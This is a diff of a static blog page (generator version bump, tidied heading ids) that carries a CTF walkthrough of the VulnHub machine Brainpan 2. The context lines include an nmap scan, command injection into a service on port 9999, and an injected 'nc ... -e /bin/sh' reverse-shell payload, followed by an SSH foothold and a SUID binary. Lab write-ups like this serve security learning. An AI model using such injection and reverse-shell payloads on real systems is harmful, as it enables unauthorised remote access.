@@ -5,7 +5,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.15" />
+<meta name="generator" content="Hugo 0.18.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://rastamouse.me/css/style.css" type="text/css">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
@@ -52,11 +52,11 @@
   </div>
   <h1 class="headline" itemprop="headline">Brainpan: 2 - Part 1</h1>
   <section class="body" itemprop="articleBody">
-    
+    <p>Following the popularity of Brainpan 1, Brainpan 2 was released as a competition on VulnHub.  I didn&rsquo;t take part, but since the VM remains on VulnHub, I had a go at it retrospectively.  The goal is to gain root access and obtain /root/flag.txt.</p>
 
-<p>Following the popularity of Brainpan 1, Brainpan 2 was released as a competition on VulnHub.  I didn&rsquo;t take part, but since the VM remains on VulnHub, I had a go at it retrospectively.  The goal is to gain root access and obtain /root/flag.txt.</p>
+<p></p>
 
-<h2 id="nmap:fd0e7d44f60d37a03464dc18f2eb9f37">Nmap</h2>
+<h2 id="nmap">Nmap</h2>
 
 <pre><code class="language-text">root@kali:~# nmap -n -sV -p- -A 192.168.127.131
   
@@ -110,7 +110,7 @@ brainpan.exe: JPEG image data, JFIF standard 1.01, comment: &quot;CREATOR: gd-jp
 
 <p>I ran <code>nikto</code> and <code>wfuzz</code> against the web service, but nothing popped except the <code>/bin/</code> directory, so I turned my attention back to the app on 9999.</p>
 
-<h2 id="command-injection:fd0e7d44f60d37a03464dc18f2eb9f37">Command Injection</h2>
+<h2 id="command-injection">Command Injection</h2>
 
 <pre><code class="language-text">&gt;&gt; GUEST
                           ACCESS GRANTED
@@ -160,7 +160,7 @@ uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
 
 <p><code>ENTER FILE TO DOWNLOAD: ; nc 192.168.127.127 4444 -e '/bin/sh'</code></p>
 
-<h2 id="ssh-foothold:fd0e7d44f60d37a03464dc18f2eb9f37">SSH Foothold</h2>
+<h2 id="ssh-foothold">SSH Foothold</h2>
 
 <p>For the sake of a coherent write-up, I&rsquo;m going to include maintaining SSH access to the system.  When I originally exploited Brainpan 2, I didn&rsquo;t do this until way later on, because I was getting annoyed at losing my remote shells due to making mistakes etc and then having to re-exploit to re-gain access.</p>
 
@@ -198,7 +198,7 @@ root@kali:~# ssh anansi @ 127.0.0.1 -p 2222
 anansi@brainpan2:~$ 
 </code></pre>
 
-<h2 id="more-trolls:fd0e7d44f60d37a03464dc18f2eb9f37">More Trolls?</h2>
+<h2 id="more-trolls">More Trolls?</h2>
 
 <p>With convenient access to the system, I carried out some more enumeration.</p>
 
@@ -229,7 +229,7 @@ reynard:x:1002:
 
 <p>I&rsquo;m going to assume that exploiting this binary won&rsquo;t give me real root access.  But I couldn&rsquo;t find any other route to gain further access to the system, so I just went with it&hellip;</p>
 
-<h2 id="msg-root:fd0e7d44f60d37a03464dc18f2eb9f37">msg_root</h2>
+<h2 id="msg-root">msg_root</h2>
 
 <p>I ran this binary quickly to see what it would do.  It appears to be an application to send a message to another user on the system.  It takes two inputs, a message and the destination user.</p>
 
@@ -357,7 +357,7 @@ $ cat /root/whatif.txt
 
 <p>All is not lost however, as this user, I can now access another SUID binary found in <code>/opt/old/brainpan-1.8</code>.  I&rsquo;ll cover this in Part 2&hellip;</p>
 
-<h3 id="findaddr-c:fd0e7d44f60d37a03464dc18f2eb9f37">findaddr.c</h3>
+<h3 id="findaddr-c">findaddr.c</h3>
 
 <pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -369,7 +369,6 @@ int main(void)
   return 0;
 }
 </code></pre>
-
   </section>
 </article>
 
